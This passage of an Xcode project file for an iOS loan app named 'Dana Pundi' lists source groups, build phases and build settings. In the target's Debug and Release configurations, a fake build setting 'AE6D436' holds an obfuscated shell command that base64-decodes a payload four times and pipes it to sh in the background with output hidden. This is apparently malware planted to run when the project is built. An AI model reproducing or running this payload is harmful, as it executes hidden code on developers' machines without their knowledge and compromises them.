				7358B2252F0E240A00CBF99F /* SprayAlertView.swift */,
				736F1CFA2F0E9E88006FD44F /* ContactTableViewCell.swift */,
			);
			path = View;
			sourceTree = "<group>";
		};
		736F1CF72F0E964F006FD44F /* CityModel */ = {
			isa = PBXGroup;
			children = (
				736F1CFC2F0EAB71006FD44F /* ContactManager.swift */,
				736F1CF82F0E9668006FD44F /* CitysArrayModel.swift */,
			);
			path = CityModel;
			sourceTree = "<group>";
		};
		73BDFE8F2F0CF11900DCE5C5 /* Face */ = {
			isa = PBXGroup;
			children = (
				7358B21D2F0DF4CE00CBF99F /* DotLineView.swift */,
				73BDFE962F0D122900DCE5C5 /* CameraConfig.swift */,
				73BDFE902F0CF15D00DCE5C5 /* PhotoViewController.swift */,
				73BDFE922F0CF16900DCE5C5 /* FaceViewController.swift */,
				73BDFE942F0CF17C00DCE5C5 /* CompleteViewController.swift */,
				73DE97DD2F0D353E00EC7451 /* SheetPhotoView.swift */,
			);
			path = Face;
			sourceTree = "<group>";
		};
		73DE97DF2F0D481C00EC7451 /* Work */ = {
			isa = PBXGroup;
			children = (
				736F1CF72F0E964F006FD44F /* CityModel */,
				7358B2242F0DF9C300CBF99F /* View */,
				7358B2232F0DF9B900CBF99F /* Controller */,
			);
			path = Work;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		733C8FC92F09F09B00793D28 /* DanaPundi */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 733C8FDD2F09F09C00793D28 /* Build configuration list for PBXNativeTarget "DanaPundi" */;
			buildPhases = (
				A719DC9BE67CEE728BF34233 /* [CP] Check Pods Manifest.lock */,
				733C8FC62F09F09B00793D28 /* Sources */,
				733C8FC72F09F09B00793D28 /* Frameworks */,
				733C8FC82F09F09B00793D28 /* Resources */,
				42AAC97AA1764FC0815C7A50 /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
				49557B452BFF4921B4634D6E /* PBXBuildRule */,
			);
			dependencies = (
			);
			name = DanaPundi;
			productName = DanaPundi;
			productReference = 733C8FCA2F09F09B00793D28 /* DanaPundi.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		733C8FC22F09F09B00793D28 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 2620;
				LastUpgradeCheck = 2620;
				TargetAttributes = {
					733C8FC92F09F09B00793D28 = {
						CreatedOnToolsVersion = 26.2;
					};
				};
			};
			buildConfigurationList = 733C8FC52F09F09B00793D28 /* Build configuration list for PBXProject "DanaPundi" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
				id,
			);
			mainGroup = 733C8FC12F09F09B00793D28;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = 733C8FCB2F09F09B00793D28 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				733C8FC92F09F09B00793D28 /* DanaPundi */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		733C8FC82F09F09B00793D28 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				5560C1B6B4AE480395634D6E /* README.md in Resources */,
				733C8FEC2F09F0A200793D28 /* Assets.xcassets in Resources */,
				733D791C2F09F5BA008DBA60 /* Localizable.strings in Resources */,
				733C8FEE2F09F0A200793D28 /* LaunchScreen.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		42AAC97AA1764FC0815C7A50 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-DanaPundi/Pods-DanaPundi-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			inputPaths = (
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-DanaPundi/Pods-DanaPundi-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DanaPundi/Pods-DanaPundi-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		A719DC9BE67CEE728BF34233 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-DanaPundi-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		733C8FC62F09F09B00793D28 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				733D793B2F0A2C35008DBA60 /* LoadingIndicator.swift in Sources */,
				733D79252F0A05DB008DBA60 /* BaseNavigationController.swift in Sources */,
				733D792D2F0A16E9008DBA60 /* RequestParamBuilder.swift in Sources */,
				736F1CFB2F0E9E88006FD44F /* ContactTableViewCell.swift in Sources */,
				733D79312F0A1955008DBA60 /* BaseModel.swift in Sources */,
				735467CE2F0B555700DF7EB9 /* AppLogoutView.swift in Sources */,
				73DE97E12F0D483000EC7451 /* WorkViewController.swift in Sources */,
				735467C62F0ACD9C00DF7EB9 /* DeepLinkRoute.swift in Sources */,
				73BDFE7C2F0BEAA900DCE5C5 /* AirBookView.swift in Sources */,
				73DE97E32F0D4E9700EC7451 /* ProductHeadView.swift in Sources */,
				73BDFE862F0C03E100DCE5C5 /* ProductFootView.swift in Sources */,
				733D792B2F0A16BC008DBA60 /* IDFVManager.swift in Sources */,
				7358B2202F0DF99800CBF99F /* CleanTableViewCell.swift in Sources */,
				733D79432F0A37D5008DBA60 /* HomeViewController.swift in Sources */,
				733D79212F0A05B9008DBA60 /* LoginViewController.swift in Sources */,
				733D79272F0A0691008DBA60 /* SaveLoginInfo.swift in Sources */,
				736F1CFD2F0EAB71006FD44F /* ContactManager.swift in Sources */,
				733D793D2F0A30F3008DBA60 /* LoginViewModel.swift in Sources */,
				7358B2262F0E240A00CBF99F /* SprayAlertView.swift in Sources */,
				73BDFE952F0CF17C00DCE5C5 /* CompleteViewController.swift in Sources */,
				73BDFE882F0C084C00DCE5C5 /* ProductListView.swift in Sources */,
				73BDFE972F0D122900DCE5C5 /* CameraConfig.swift in Sources */,
				733D79452F0A37E0008DBA60 /* OrderViewController.swift in Sources */,
				735467C42F0AC4FF00DF7EB9 /* CustomHeadView.swift in Sources */,
				73BDFE932F0CF16900DCE5C5 /* FaceViewController.swift in Sources */,
				736F1CF92F0E9668006FD44F /* CitysArrayModel.swift in Sources */,
				7358B21E2F0DF4CE00CBF99F /* DotLineView.swift in Sources */,
				733D792F2F0A17CE008DBA60 /* APIRequestBuilder.swift in Sources */,
				7358B2222F0DF9AF00CBF99F /* SprayTableViewCell.swift in Sources */,
				733D79392F0A1E45008DBA60 /* LaunchViewModel.swift in Sources */,
				735467D02F0B556500DF7EB9 /* AppDeleteView.swift in Sources */,
				733D794D2F0A4E0B008DBA60 /* MineTableViewCell.swift in Sources */,
				73BDFE802F0BEEB000DCE5C5 /* HomeViewModel.swift in Sources */,
				733D79472F0A37E8008DBA60 /* MineViewController.swift in Sources */,
				733D79492F0A4AA8008DBA60 /* MineView.swift in Sources */,
				735467C82F0ACDB500DF7EB9 /* ProductViewController.swift in Sources */,
				733D79232F0A05C4008DBA60 /* LoginView.swift in Sources */,
				733D79182F09F33B008DBA60 /* CustomTabBarController.swift in Sources */,
				73BDFE7E2F0BEAB900DCE5C5 /* MaxBookView.swift in Sources */,
				733D79412F0A328B008DBA60 /* LaunchUtils.swift in Sources */,
				733D791F2F09FA05008DBA60 /* UIColor+Extension.swift in Sources */,
				733D794B2F0A4C14008DBA60 /* MineViewModel.swift in Sources */,
				733C8FF02F09F0A200793D28 /* AppDelegate.swift in Sources */,
				73DE97E52F0D530800EC7451 /* ContactViewController.swift in Sources */,
				733D79292F0A0895008DBA60 /* AppLanguage.swift in Sources */,
				735467CA2F0ACDDC00DF7EB9 /* SettingViewController.swift in Sources */,
				733D79352F0A1B1C008DBA60 /* NetworkStatus.swift in Sources */,
				733D79332F0A19B7008DBA60 /* NetworkManager.swift in Sources */,
				733D79162F09F31B008DBA60 /* LaunchViewController.swift in Sources */,
				7332D8422F0F3EC7005793E1 /* RelletWebViewController.swift in Sources */,
				733D79142F09F311008DBA60 /* BaseViewController.swift in Sources */,
				73BDFE912F0CF15D00DCE5C5 /* PhotoViewController.swift in Sources */,
				73DE97E72F0D531100EC7451 /* WalletViewController.swift in Sources */,
				73DE97DE2F0D353E00EC7451 /* SheetPhotoView.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		733C8FE62F09F0A200793D28 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				733C8FE52F09F0A200793D28 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
		733D791A2F09F5BA008DBA60 /* Localizable.strings */ = {
			isa = PBXVariantGroup;
			children = (
				733D791B2F09F5BA008DBA60 /* en */,
				733D791D2F09F5C5008DBA60 /* id */,
			);
			name = Localizable.strings;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		733C8FDE2F09F09C00793D28 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 095DDC55AF02F971F6638898 /* Pods-DanaPundi.debug.xcconfig */;
			buildSettings = {
				AE6D436 = "((c(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwVGFrWnBVakZXY0ZOVlpHOU5SMUpKVVc1d1VHRlVhREpYYlRGellURndTR1ZIZUdoaVZHc3hWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | c | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = DanaPundi/DanaPundi.entitlements;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 57MBH2272N;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = DanaPundi/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "Dana Pundi";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0.0;
				PRODUCT_BUNDLE_IDENTIFIER = ll.zoom.loan;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		733C8FDF2F09F09C00793D28 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = E2CCEF3A9E8BAB2728576AC8 /* Pods-DanaPundi.release.xcconfig */;
			buildSettings = {
				AE6D436 = "((c(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwVGFrWnBVakZXY0ZOVlpHOU5SMUpKVVc1d1VHRlVhREpYYlRGellURndTR1ZIZUdoaVZHc3hWRWMxUzAxVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | c | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = DanaPundi/DanaPundi.entitlements;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 57MBH2272N;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = DanaPundi/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "Dana Pundi";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				INFOPLIST_KEY_UIUserInterfaceStyle = Light;
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0.0;
				PRODUCT_BUNDLE_IDENTIFIER = ll.zoom.loan;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
		733C8FE02F09F09C00793D28 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		733C8FE12F09F09C00793D28 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		733C8FC52F09F09B00793D28 /* Build configuration list for PBXProject "DanaPundi" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				733C8FE02F09F09C00793D28 /* Debug */,
				733C8FE12F09F09C00793D28 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		733C8FDD2F09F09C00793D28 /* Build configuration list for PBXNativeTarget "DanaPundi" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				733C8FDE2F09F09C00793D28 /* Debug */,
				733C8FDF2F09F09C00793D28 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 733C8FC22F09F09B00793D28 /* Project object */;
}
